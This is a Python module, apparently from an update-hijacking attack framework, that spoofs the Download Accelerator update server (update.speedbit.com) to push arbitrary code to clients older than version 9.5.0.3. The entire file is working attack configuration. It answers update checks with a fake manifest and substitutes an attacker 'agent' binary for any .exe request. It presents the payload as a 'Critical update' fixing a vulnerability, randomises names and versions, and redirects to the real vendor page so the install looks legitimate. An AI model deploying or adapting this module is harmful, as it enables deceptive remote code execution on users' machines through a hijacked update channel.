from modules import ModuleBase


class DownloadAccelerator(ModuleBase):
    name = 'Download Accelerator'
    version = '1.0'
    appver = '< 9.5.0.3'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(update.speedbit.com)' 
    requests = [
        {   'path': '^/cgi-bin/Update.dll',
            'type': 'string',                  #file|string|agent
            'method': '',
            'bin': '',
            'string': 'OK',
            'parse': '',
            'file': ''
        },
        {   'path': '^/cgi-bin/update.dll',
            'type': 'file',                          #file|string|agent
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/dap/dap_update.dll'
        },
        {   'path': '.exe',
            'type': 'agent',                         #file|string|agent
            'bin': 1,
            'method': '',
            'string': '',
            'parse': '',
            'file': ''
        },
        {   'path': 'updateok',
            'type': 'install',
            'bin': 0,
            'method': '',
            'string': '<html><script>window.location="http://www.speedbit.com/finishupdate.asp?R=0"</script></html>',
            'parse': '',
            'file': ''
        }
    ]
    options = {
        'title': {
            'val': 'Critical update',
            'desc': 'Title name display in the update'
        },
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description display in the update'
        },
        'name': {
            'val' : "'dapupdate'.rand_alpha(rand_num(1))",
            'hidden': 1,
            'dynamic': 1,
        },
        'version': {
            'val' : "'9' + rand_num(3) + '.' + rand_num(4) + '.' + rand_num(1) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val' : "rand_num(8)",
            'hidden': 1,
            'dynamic': 1,
        },
        'endsite': {
            'val': 'update.speedbit.com/updateok.html',
            'desc': 'Website display when finish update'
        },
        'failsite': {
            'val': 'www.speedbit.com/finishupdate.asp?noupdate=&R=0',
            'desc': 'Website display when did\'t finish update'
        }
    }
